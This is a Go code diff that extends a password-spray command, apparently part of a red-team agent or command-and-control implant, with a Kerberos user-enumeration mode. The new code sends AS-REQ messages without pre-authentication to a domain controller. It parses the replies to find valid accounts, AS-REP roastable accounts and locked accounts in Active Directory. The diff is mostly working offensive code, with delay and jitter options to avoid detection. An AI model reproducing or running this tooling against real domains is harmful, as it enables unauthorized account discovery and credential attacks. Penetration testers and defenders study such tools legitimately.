@@ -2,6 +2,7 @@ package commands
 
 import (
 	"crypto/tls"
+	"encoding/binary"
 	"encoding/json"
 	"fmt"
 	"math/rand"
@@ -15,21 +16,24 @@ import (
 	"github.com/hirochachacha/go-smb2"
 	"github.com/jcmturner/gokrb5/v8/client"
 	krbconfig "github.com/jcmturner/gokrb5/v8/config"
+	"github.com/jcmturner/gokrb5/v8/iana/nametype"
+	"github.com/jcmturner/gokrb5/v8/messages"
+	"github.com/jcmturner/gokrb5/v8/types"
 )
 
 type SprayCommand struct{}
 
 func (c *SprayCommand) Name() string { return "spray" }
 func (c *SprayCommand) Description() string {
-	return "Password spray against AD via Kerberos, LDAP, or SMB (T1110.003)"
+	return "Password spray or user enumeration against AD via Kerberos, LDAP, or SMB (T1110.003, T1589.002)"
 }
 
 type sprayArgs struct {
-	Action   string `json:"action"`   // kerberos, ldap, smb
+	Action   string `json:"action"`   // kerberos, ldap, smb, enumerate
 	Server   string `json:"server"`   // target DC/server
 	Domain   string `json:"domain"`   // domain name
 	Users    string `json:"users"`    // newline-separated usernames
-	Password string `json:"password"` // password to spray
+	Password string `json:"password"` // password to spray (not required for enumerate)
 	Delay    int    `json:"delay"`    // delay between attempts in ms (default: 0)
 	Jitter   int    `json:"jitter"`   // jitter percentage 0-100 (default: 0)
 	Port     int    `json:"port"`     // optional custom port
@@ -63,9 +67,18 @@ func (c *SprayCommand) Execute(task structs.Task) structs.CommandResult {
 	if args.Action == "" {
 		args.Action = "kerberos"
 	}
-	if args.Server == "" || args.Domain == "" || args.Users == "" || args.Password == "" {
+
+	// Validate required params — enumerate doesn't need password
+	if args.Server == "" || args.Domain == "" || args.Users == "" {
 		return structs.CommandResult{
-			Output:    "Error: server, domain, users, and password are required",
+			Output:    "Error: server, domain, and users are required",
+			Status:    "error",
+			Completed: true,
+		}
+	}
+	if args.Action != "enumerate" && args.Password == "" {
+		return structs.CommandResult{
+			Output:    "Error: password is required for spray actions (not required for enumerate)",
 			Status:    "error",
 			Completed: true,
 		}
@@ -96,9 +109,11 @@ func (c *SprayCommand) Execute(task structs.Task) structs.CommandResult {
 		return sprayLDAP(args, users)
 	case "smb":
 		return spraySMB(args, users)
+	case "enumerate":
+		return sprayEnumerate(args, users)
 	default:
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s. Use: kerberos, ldap, smb", args.Action),
+			Output:    fmt.Sprintf("Unknown action: %s. Use: kerberos, ldap, smb, enumerate", args.Action),
 			Status:    "error",
 			Completed: true,
 		}
@@ -388,4 +403,180 @@ func classifySMBError(err error) string {
 	default:
 		return fmt.Sprintf("Error: %v", err)
 	}
+}
+
+// --- Kerberos user enumeration (no credentials needed) ---
+
+func sprayEnumerate(args sprayArgs, users []string) structs.CommandResult {
+	realm := strings.ToUpper(args.Domain)
+	krb5Conf := buildKrb5Config(realm, args.Server)
+	cfg, err := krbconfig.NewFromString(krb5Conf)
+	if err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error creating Kerberos config: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	var sb strings.Builder
+	sb.WriteString(fmt.Sprintf("[*] Kerberos user enumeration against %s (%s)\n", args.Server, realm))
+	sb.WriteString(fmt.Sprintf("[*] %d usernames to check\n", len(users)))
+	if args.Delay > 0 {
+		sb.WriteString(fmt.Sprintf("[*] Delay: %dms", args.Delay))
+		if args.Jitter > 0 {
+			sb.WriteString(fmt.Sprintf(" (jitter: %d%%)", args.Jitter))
+		}
+		sb.WriteString("\n")
+	}
+	sb.WriteString(strings.Repeat("-", 60) + "\n")
+
+	valid := 0
+	asrepRoastable := 0
+	for i, user := range users {
+		if i > 0 {
+			sprayDelay(args)
+		}
+
+		status := enumKerberosUser(cfg, realm, args.Server, user)
+		switch {
+		case status == "exists":
+			sb.WriteString(fmt.Sprintf("[+] VALID: %s (pre-auth required)\n", user))
+			valid++
+		case status == "asrep":
+			sb.WriteString(fmt.Sprintf("[+] VALID: %s (NO PRE-AUTH — AS-REP roastable!)\n", user))
+			valid++
+			asrepRoastable++
+		case status == "not_found":
+			// Don't print non-existent users by default (too noisy)
+		default:
+			sb.WriteString(fmt.Sprintf("[?] %s — %s\n", user, status))
+		}
+	}
+
+	sb.WriteString(strings.Repeat("-", 60) + "\n")
+	sb.WriteString(fmt.Sprintf("[*] Results: %d valid users found out of %d checked", valid, len(users)))
+	if asrepRoastable > 0 {
+		sb.WriteString(fmt.Sprintf(" (%d AS-REP roastable!)", asrepRoastable))
+	}
+	sb.WriteString("\n")
+
+	return structs.CommandResult{
+		Output:    sb.String(),
+		Status:    "success",
+		Completed: true,
+	}
+}
+
+func enumKerberosUser(cfg *krbconfig.Config, realm, kdc, username string) string {
+	// Build AS-REQ without pre-auth data (same technique as AS-REP roasting)
+	cname := types.PrincipalName{
+		NameType:   nametype.KRB_NT_PRINCIPAL,
+		NameString: []string{username},
+	}
+
+	asReq, err := messages.NewASReqForTGT(realm, cfg, cname)
+	if err != nil {
+		return fmt.Sprintf("error: %v", err)
+	}
+	asReq.PAData = types.PADataSequence{}
+
+	reqBytes, err := asReq.Marshal()
+	if err != nil {
+		return fmt.Sprintf("error: %v", err)
+	}
+
+	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:88", kdc), 10*time.Second)
+	if err != nil {
+		return fmt.Sprintf("connection error: %v", err)
+	}
+	defer conn.Close()
+
+	if err := conn.SetDeadline(time.Now().Add(10 * time.Second)); err != nil {
+		return fmt.Sprintf("deadline error: %v", err)
+	}
+
+	// Send length-prefixed AS-REQ
+	lenBuf := make([]byte, 4)
+	binary.BigEndian.PutUint32(lenBuf, uint32(len(reqBytes)))
+	if _, err := conn.Write(lenBuf); err != nil {
+		return fmt.Sprintf("send error: %v", err)
+	}
+	if _, err := conn.Write(reqBytes); err != nil {
+		return fmt.Sprintf("send error: %v", err)
+	}
+
+	// Read response
+	if _, err := sprayReadFull(conn, lenBuf); err != nil {
+		return fmt.Sprintf("read error: %v", err)
+	}
+	respLen := binary.BigEndian.Uint32(lenBuf)
+	if respLen > 1<<20 {
+		return "response too large"
+	}
+
+	respBytes := make([]byte, respLen)
+	if _, err := sprayReadFull(conn, respBytes); err != nil {
+		return fmt.Sprintf("read error: %v", err)
+	}
+
+	// Try to unmarshal as AS-REP (user exists AND has no pre-auth)
+	var asRep messages.ASRep
+	if err := asRep.Unmarshal(respBytes); err == nil {
+		return "asrep" // User exists and is AS-REP roastable
+	}
+
+	// Must be a KRBError — check the error code
+	// KRBError is application tag 30 (0x7e in DER)
+	// The error code is deep in the ASN.1 structure; parse the raw bytes
+	errCode := extractKrbErrorCode(respBytes)
+	switch errCode {
+	case 6: // KDC_ERR_C_PRINCIPAL_UNKNOWN
+		return "not_found"
+	case 24: // KDC_ERR_PREAUTH_FAILED
+		return "exists" // This shouldn't happen without creds, but handle it
+	case 25: // KDC_ERR_PREAUTH_REQUIRED
+		return "exists"
+	case 18: // KDC_ERR_CLIENT_REVOKED
+		return "disabled/locked"
+	default:
+		return fmt.Sprintf("krb_error_%d", errCode)
+	}
+}
+
+// extractKrbErrorCode extracts the error-code from a raw KRB-ERROR ASN.1 message.
+// KRB-ERROR ::= [APPLICATION 30] SEQUENCE { ... error-code [6] Int32, ... }
+func extractKrbErrorCode(data []byte) int {
+	// Quick scan: find context tag [6] (0xa6) followed by length and INTEGER (0x02)
+	for i := 0; i < len(data)-4; i++ {
+		if data[i] == 0xa6 {
+			// Context tag [6] — next byte is length, then INTEGER tag
+			innerStart := i + 2
+			if innerStart < len(data) && data[innerStart] == 0x02 {
+				// INTEGER tag — next byte is length, then value
+				intLen := int(data[innerStart+1])
+				valStart := innerStart + 2
+				if valStart+intLen <= len(data) && intLen <= 4 {
+					val := 0
+					for j := 0; j < intLen; j++ {
+						val = (val << 8) | int(data[valStart+j])
+					}
+					return val
+				}
+			}
+		}
+	}
+	return -1
+}
+
+func sprayReadFull(conn net.Conn, buf []byte) (int, error) {
+	total := 0
+	for total < len(buf) {
+		n, err := conn.Read(buf[total:])
+		total += n
+		if err != nil {
+			return total, err
+		}
+	}
+	return total, nil
 }
